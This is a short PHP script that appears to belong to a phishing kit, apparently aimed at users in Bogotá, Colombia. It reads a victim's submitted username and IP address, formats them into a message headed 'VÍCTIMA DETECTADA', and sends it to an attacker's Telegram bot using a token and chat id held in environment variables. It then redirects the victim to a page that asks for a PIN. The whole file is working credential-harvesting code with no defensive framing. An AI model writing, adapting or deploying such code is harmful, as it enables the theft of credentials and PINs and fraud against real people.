<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$usuario = $_POST['usuario']; // O el nombre del campo que uses

// 1. Intentar registrar en la base de datos (si la DB está lista)
@actualizar_registro_usuario($ip, $usuario); 

// 2. LEER VARIABLES DE ENTORNO DE RAILWAY
$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');

if($token && $id) {
    $mensaje = "🚀 *VÍCTIMA DETECTADA*\n\n";
    $mensaje .= "👤 Usuario: " . $usuario . "\n";
    $mensaje .= "🌐 IP: " . $ip . "\n";
    $mensaje .= "📍 Ciudad: Bogotá, CO\n";
    
    // Enviar a Telegram vía CURL (más seguro en Railway)
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
    @file_get_contents($url);
}

// 3. Saltar al siguiente paso (el PIN)
header("Location: ../a/pin.php"); 
?>
